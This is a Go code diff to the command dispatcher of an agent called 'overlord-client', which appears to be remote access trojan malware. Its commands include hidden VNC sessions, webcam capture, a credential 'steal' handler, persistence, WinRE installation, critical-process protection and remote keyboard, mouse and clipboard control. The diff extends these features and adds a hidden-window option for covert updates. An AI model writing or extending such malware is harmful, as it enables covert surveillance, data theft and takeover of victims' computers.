@@ -17,6 +17,7 @@ import (
 	"overlord-client/cmd/agent/audio"
 	"overlord-client/cmd/agent/capture"
 	"overlord-client/cmd/agent/console"
+	"overlord-client/cmd/agent/criticalproc"
 	"overlord-client/cmd/agent/filesearch"
 	"overlord-client/cmd/agent/persistence"
 	"overlord-client/cmd/agent/plugins"
@@ -80,6 +81,7 @@ func resetForReconnect(env *runtime.Env) {
 	}
 
 	cancelAllCommands()
+	capture.ResetFrameSlots()
 
 	env.DesktopMu.Lock()
 	if env.DesktopCancel != nil {
@@ -351,6 +353,10 @@ func sendCommandResultSafe(env *runtime.Env, cmdID string, ok bool, message stri
 	if err := wire.WriteMsg(context.Background(), env.Conn, res); err != nil {
 		log.Printf("command_result send failed: %v", err)
 	}
+}
+
+func sendCommandResultAsync(env *runtime.Env, cmdID string) {
+	go sendCommandResultSafe(env, cmdID, true, "")
 }
 
 func payloadNumberToInt64(value interface{}) int64 {
@@ -698,9 +704,62 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		capture.SetMaxResolution(maxH)
 		sendCommandResultSafe(env, cmdID, true, "")
 		return nil
+	case "clipboard_sync_start":
+		payload, _ := envelope["payload"].(map[string]interface{})
+		source := "rd"
+		if payload != nil {
+			if v, ok := payload["source"].(string); ok && v != "" {
+				source = v
+			}
+		}
+		env.ClipboardSyncMu.Lock()
+		if env.ClipboardSyncCancel != nil {
+			env.ClipboardSyncCancel()
+			if env.ClipboardSyncDone != nil {
+				<-env.ClipboardSyncDone
+			}
+		}
+		syncCtx, syncCancel := context.WithCancel(ctx)
+		env.ClipboardSyncCancel = syncCancel
+		env.ClipboardSyncSource = source
+		done := make(chan struct{})
+		env.ClipboardSyncDone = done
+		goSafe("clipboard_sync", env.Cancel, func() {
+			ClipboardSyncStart(syncCtx, env, source)
+			close(done)
+		})
+		env.ClipboardSyncMu.Unlock()
+		log.Printf("clipboard_sync: start (%s)", source)
+		sendCommandResultSafe(env, cmdID, true, "")
+		return nil
+	case "clipboard_sync_stop":
+		env.ClipboardSyncMu.Lock()
+		if env.ClipboardSyncCancel != nil {
+			env.ClipboardSyncCancel()
+			if env.ClipboardSyncDone != nil {
+				<-env.ClipboardSyncDone
+			}
+			env.ClipboardSyncCancel = nil
+			env.ClipboardSyncDone = nil
+		}
+		env.ClipboardSyncMu.Unlock()
+		log.Printf("clipboard_sync: stop")
+		sendCommandResultSafe(env, cmdID, true, "")
+		return nil
+	case "clipboard_set":
+		payload, _ := envelope["payload"].(map[string]interface{})
+		text := ""
+		if payload != nil {
+			if v, ok := payload["text"].(string); ok {
+				text = v
+			}
+		}
+		ClipboardSyncSet(text)
+		sendCommandResultSafe(env, cmdID, true, "")
+		return nil
 	case "desktop_mouse_move":
 		if !env.MouseControl {
-			sendCommandResultSafe(env, cmdID, true, "")
+			sendCommandResultAsync(env, cmdID)
 			return nil
 		}
 		payload := payloadAsMap(envelope["payload"])
@@ -708,11 +767,11 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		y, _ := payloadInt32(payload, "y")
 		absX, absY := resolveDesktopPoint(env.SelectedDisplay, x, y)
 		setCursorPos(absX, absY)
-		sendCommandResultSafe(env, cmdID, true, "")
+		sendCommandResultAsync(env, cmdID)
 		return nil
 	case "desktop_mouse_down":
 		if !env.MouseControl {
-			sendCommandResultSafe(env, cmdID, true, "")
+			sendCommandResultAsync(env, cmdID)
 			return nil
 		}
 		payload := payloadAsMap(envelope["payload"])
@@ -724,11 +783,11 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			}
 		}
 		sendMouseDown(btn)
-		sendCommandResultSafe(env, cmdID, true, "")
+		sendCommandResultAsync(env, cmdID)
 		return nil
 	case "desktop_mouse_up":
 		if !env.MouseControl {
-			sendCommandResultSafe(env, cmdID, true, "")
+			sendCommandResultAsync(env, cmdID)
 			return nil
 		}
 		payload := payloadAsMap(envelope["payload"])
@@ -740,11 +799,11 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			}
 		}
 		sendMouseUp(btn)
-		sendCommandResultSafe(env, cmdID, true, "")
+		sendCommandResultAsync(env, cmdID)
 		return nil
 	case "desktop_key_down":
 		if !env.KeyboardControl {
-			sendCommandResultSafe(env, cmdID, true, "")
+			sendCommandResultAsync(env, cmdID)
 			return nil
 		}
 		payload, _ := envelope["payload"].(map[string]interface{})
@@ -755,14 +814,13 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			}
 		}
 		if vk := keyCodeToVK(code); vk != 0 {
-			log.Printf("desktop: key down code=%s vk=%d", code, vk)
 			sendKeyDown(vk)
 		}
-		sendCommandResultSafe(env, cmdID, true, "")
+		sendCommandResultAsync(env, cmdID)
 		return nil
 	case "desktop_key_up":
 		if !env.KeyboardControl {
-			sendCommandResultSafe(env, cmdID, true, "")
+			sendCommandResultAsync(env, cmdID)
 			return nil
 		}
 		payload, _ := envelope["payload"].(map[string]interface{})
@@ -773,14 +831,13 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			}
 		}
 		if vk := keyCodeToVK(code); vk != 0 {
-			log.Printf("desktop: key up code=%s vk=%d", code, vk)
 			sendKeyUp(vk)
 		}
-		sendCommandResultSafe(env, cmdID, true, "")
+		sendCommandResultAsync(env, cmdID)
 		return nil
 	case "desktop_text":
 		if !env.KeyboardControl {
-			sendCommandResultSafe(env, cmdID, true, "")
+			sendCommandResultAsync(env, cmdID)
 			return nil
 		}
 		payload, _ := envelope["payload"].(map[string]interface{})
@@ -791,10 +848,9 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			}
 		}
 		if text != "" {
-			log.Printf("desktop: text input len=%d", len(text))
 			sendTextInput(text)
 		}
-		sendCommandResultSafe(env, cmdID, true, "")
+		sendCommandResultAsync(env, cmdID)
 		return nil
 
 	// ==================== HVNC COMMANDS ====================
@@ -1262,7 +1318,6 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			}
 		}
 		if vk := keyCodeToVKHVNC(code); vk != 0 {
-			log.Printf("hvnc: key down code=%s vk=%d", code, vk)
 			enqueueHVNCInput(hvncInputEvent{kind: hvncInputKeyDown, vk: vk})
 		}
 		return nil
@@ -1279,7 +1334,6 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			}
 		}
 		if vk := keyCodeToVKHVNC(code); vk != 0 {
-			log.Printf("hvnc: key up code=%s vk=%d", code, vk)
 			enqueueHVNCInput(hvncInputEvent{kind: hvncInputKeyUp, vk: vk})
 		}
 		return nil
@@ -1526,6 +1580,35 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		env.WebcamUseMaxFPS = useMax
 		sendCommandResultSafe(env, cmdID, true, "")
 		return nil
+	case "webcam_set_quality":
+		payload, _ := envelope["payload"].(map[string]interface{})
+		quality := 0
+		codec := ""
+		if payload != nil {
+			if q, ok := payloadInt(payload, "quality"); ok {
+				quality = q
+			}
+			if v, ok := payload["codec"].(string); ok {
+				codec = v
+			}
+		}
+		if quality < 0 {
+			quality = 0
+		}
+		if quality > 100 {
+			quality = 100
+		}
+		switch codec {
+		case "jpeg", "h264":
+			// valid
+		default:
+			codec = "jpeg"
+		}
+		env.WebcamQuality = quality
+		env.WebcamCodec = codec
+		log.Printf("webcam: set quality=%d codec=%s", quality, codec)
+		sendCommandResultSafe(env, cmdID, true, "")
+		return nil
 	case "webcam_stop":
 		env.WebcamMu.Lock()
 		log.Printf("webcam: stop requested")
@@ -1694,7 +1777,8 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		payload, _ := envelope["payload"].(map[string]interface{})
 		path, _ := payload["path"].(string)
 		hash, _ := payload["hash"].(string)
-		return HandleAgentUpdate(ctx, env, cmdID, path, hash)
+		hideWindow, _ := payload["hideWindow"].(bool)
+		return HandleAgentUpdate(ctx, env, cmdID, path, hash, hideWindow)
 	case "process_list":
 		return HandleProcessList(ctx, env, cmdID)
 	case "process_kill":
@@ -1800,6 +1884,22 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: false, Message: err.Error()})
 		}
 		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: true})
+	case "winre_install":
+		payload := payloadAsMap(envelope["payload"])
+		useSelf := false
+		if v, ok := payload["useSelf"].(bool); ok {
+			useSelf = v
+		}
+		filePath, _ := payload["filePath"].(string)
+		if err := handleWinREInstall(ctx, env, cmdID, filePath, useSelf); err != nil {
+			return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: false, Message: err.Error()})
+		}
+		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: true})
+	case "winre_uninstall":
+		if err := handleWinREUninstall(ctx, env, cmdID); err != nil {
+			return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: false, Message: err.Error()})
+		}
+		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: true})
 	case "uninstall":
 		res := wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: true}
 		_ = wire.WriteMsg(ctx, env.Conn, res)
@@ -1808,11 +1908,13 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			log.Printf("uninstall: failed to remove persistence: %v", err)
 		}
 
+		criticalproc.Teardown()
 		os.Exit(0)
 	case "disconnect":
 		res := wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: true}
 		_ = wire.WriteMsg(ctx, env.Conn, res)
 		resetForReconnect(env)
+		criticalproc.Teardown()
 		os.Exit(0)
 		return nil
 	case "reconnect":
@@ -1828,12 +1930,27 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		return HandleProxyData(ctx, env, cmdID, payload)
 	case "proxy_close":
 		return HandleProxyClose(ctx, env, cmdID)
-	case "cleanup":
-		return HandleCleanup(ctx, env, cmdID)
-	case "fun":
-		return HandleFun(ctx, env, cmdID, envelope)
+
+	// ── Local-only commands (stealer, cleanup, fun) ──
 	case "steal":
-		return HandleSteal(ctx, env, cmdID)
+		go func() {
+			defer recoverAndLog("steal handler", nil)
+			HandleSteal(ctx, env, cmdID, envelope)
+		}()
+		return nil
+	case "cleanup":
+		go func() {
+			defer recoverAndLog("cleanup handler", nil)
+			HandleCleanup(ctx, env, cmdID)
+		}()
+		return nil
+	case "fun":
+		go func() {
+			defer recoverAndLog("fun handler", nil)
+			HandleFun(ctx, env, cmdID, envelope)
+		}()
+		return nil
+
 	default:
 		log.Printf("command: unknown action=%s", action)
 		res := wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: false, Message: "unknown command"}
